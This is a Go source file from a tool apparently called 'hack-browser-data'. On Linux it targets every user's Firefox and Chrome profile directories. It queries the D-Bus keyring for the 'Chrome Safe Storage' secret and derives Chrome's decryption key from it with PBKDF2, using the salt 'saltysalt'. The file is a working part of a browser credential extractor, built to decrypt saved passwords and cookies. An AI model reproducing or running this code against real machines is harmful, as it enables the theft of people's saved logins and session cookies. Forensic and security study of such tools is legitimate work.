package core

import (
	"crypto/sha1"
	"github.com/godbus/dbus/v5"
	keyring "github.com/ppacher/go-dbus-keyring"
	"hack-browser-data/log"

	"golang.org/x/crypto/pbkdf2"
)

const (
	fireFoxProfilePath = "/home/*/.mozilla/firefox/*.default-release/"
	chromeProfilePath  = "/home/*/.config/google-chrome/*/"
)

var (
	browserList = map[string]struct {
		ProfilePath string
		Name        string
		KeyPath     string
		New         func(profile, key, name string) (Browser, error)
	}{
		"firefox": {
			ProfilePath: fireFoxProfilePath,
			Name:        firefoxName,
			New:         decryptFirefox,
		},
		"chrome": {
			ProfilePath: chromeProfilePath,
			Name:        chromeName,
			New:         decryptChromium,
		},
	}
)

func (c *chromium) InitSecretKey() error {
	//what is d-bus @https://dbus.freedesktop.org/
	var chromeSecret []byte
	conn, err := dbus.SessionBus()
	if err != nil {
		return err
	}
	svc, err := keyring.GetSecretService(conn)
	if err != nil {
		return err
	}
	session, err := svc.OpenSession()
	if err != nil {
		return err
	}
	defer func() {
		if err = session.Close(); err != nil {
			log.Error(err)
		}
	}()
	collections, err := svc.GetAllCollections()
	if err != nil {
		return err
	}
	for _, col := range collections {
		items, err := col.GetAllItems()
		if err != nil {
			return err
		}
		for _, item := range items {
			i, err := item.GetLabel()
			if err != nil {
				log.Error(err)
				continue
			}
			if i == "Chrome Safe Storage" {
				se, err := item.GetSecret(session.Path())
				if err != nil {
					return err
				}
				chromeSecret = se.Value
			}
		}
	}
	var chromeSalt = []byte("saltysalt")
	if chromeSecret == nil {
		return ErrChromeSecretIsEmpty
	}
	// @https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_linux.cc
	key := pbkdf2.Key(chromeSecret, chromeSalt, 1, 16, sha1.New)
	c.SecretKey = key
	return nil
}
